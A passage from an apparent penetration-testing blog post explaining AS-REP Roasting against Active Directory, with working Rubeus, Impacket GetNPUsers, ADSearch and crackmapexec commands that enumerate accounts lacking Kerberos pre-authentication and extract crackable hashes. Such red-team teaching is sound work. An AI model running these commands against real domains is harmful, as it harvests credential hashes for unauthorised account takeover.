---
title: AS-REP Roasting
url: http://pentestlab.blog/2024/02/20/as-rep-roasting/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-03
fetch_date: 2025-10-06T22:28:29.846524
---

# AS-REP Roasting

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [February 20, 2024February 19, 2024](https://pentestlab.blog/2024/02/20/as-rep-roasting/)

# AS-REP Roasting

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Credential Access](https://pentestlab.blog/category/red-team/credential-access/).[Leave a Comment on AS-REP Roasting](https://pentestlab.blog/2024/02/20/as-rep-roasting/#respond)

Active Directory users that have the Kerberos pre-authentication enabled and require access to a resource initiate the Kerberos authentication process by sending an Authentication Server Request (AS-REQ) message to the domain controller. The timestamp on that message is encrypted with the hash of the user’s password. The domain controller can decrypt the timestamp using its own record of the user password hash and it will send back an Authentication Response (AS-REP) that contains a TGT (Ticket Granting Ticket) issued by the Key Distribution Center which will be utilized for any future access requests by the user.

Any users in the domain that have the Kerberos pre-authentication disabled enables red teams to request authentication data for any user in the Active Directory enforcing the domain controller to return the AS-REP message which is encrypted with the password hash of the user. Conducting offline cracking, the password of the user can retrieved which could be used for lateral movement. Even though by default the option *Do not require Kerberos pre-authentication* is not enabled, some Active Directory accounts such as service accounts might have that option enabled for compatibility reasons i.e. to allow specific applications to work properly since some applications doesn’t support Kerberos pre-authentication.

Specifically, the Kerberos pre-authentication requires the user to supply it’s secret key which is derived from it’s password prior to any TGT issued by the Key Distribution Center (KDC) as a verification. The ticket granting ticket is sent to the user in the *KRB\_AS\_REP* message which also contains the session key. When the Kerberos pre-authentication is disabled, a user in the network can skip this verification and request TGT’s that will contain the session keys for offline cracking.

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roast-kerberos-preauthentication.png?w=783)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roast-kerberos-preauthentication.png)

Kerberos Pre-authentication

## Enumeration

In order to be able to conduct the AS-REP Roasting technique the vulnerable accounts needs to be enumerated. *ADSearch* is a tool that can perform LDAP queries in order to enumerate active directory objects. The *sAMAccountType=805306368* will query only Active Directory users and not computert accounts or groups. The *userAccountControl:1.2.840.113556.1.4.803:=4194304* defines the users that have the setting *Do not require Kerberos pre-authentication* enabled.

```
dotnet inline-execute /home/kali/ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-adsearch.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-adsearch.png)

AS-REP Roasting – ADSearch

It is also feasible to identify vulnerable to AS-REP roasting accounts from a non-domain joined system using the Impacket module *GetNPUsers*.

```
impacket-GetNPUsers -dc-ip 10.0.0.1 -ts  red.lab/peter:Password123
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-authenticated.png?w=636)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-authenticated.png)

AS-REP Roasting – Impacket Authenticated

## AS-REP

The technique of AS-REP Roast has been implemented in Rubeus tool with the flag *asreproast*. Rubeus will identify all accounts in the domain that do not require Kerberos pre-authentication and extract their AS-REP hashes.

```
dotnet inline-execute /home/kali/Rubeus.exe asreproast
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-rubeus-c2.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-rubeus-c2.png)

AS-REP Roasting – Rubeus over C2

```
.\Rubeus.exe asreproast
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-rubeus.png?w=930)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-rubeus.png)

AS-REP Roasting – Rubeus

It is also feasible to conduct the AS-REP Roasting technique from a non-domain joined system and from unauthenticated perspective with the module *GetNPUsers* from Impacket suite. Supplying a list of active directory usernames against the domain controller will retrieve the Kerberos authentication response (AS-REP) hashes of the vulnerable accounts.

```
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip 10.0.0.1 red.lab/
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-unauthenticated.png?w=638)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-unauthenticated.png)

AS-REP Roasting – Impacket No Pass

```
impacket-GetNPUsers -usersfile /home/kali/Desktop/usernames.txt -request -dc-ip 10.0.0.1 "red.lab/"
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket.png?w=626)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket.png)

AS-REP Roasting – Impacket

Execution of the command below will perform the authentication in the domain controller and will format the AS-REP hash so it could be used by *john the ripper*.

```
impacket-GetNPUsers red.lab/peter:Password123 -request -format john | grep "$krb5asrep$"
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-john.png?w=628)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-impacket-john.png)

AS-REP Roasting – Impacket John The Ripper Format

Alternatively, *crackmapexec* can also perform the AS-REP Roasting technique from authenticated or unauthenticated context.

```
crackmapexec ldap -dc-ip 10.0.0.1 -u usernames.txt -p '' --asreproast asreproast.out
```

[![](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-crackmapexec-unauthenticated.png?w=626)](https://pentestlab.blog/wp-content/uploads/2024/01/as-rep-roasting-crackmapexec-unauthenticated.png)

AS-REP Roasting – Crackmapexec Unauthenticat...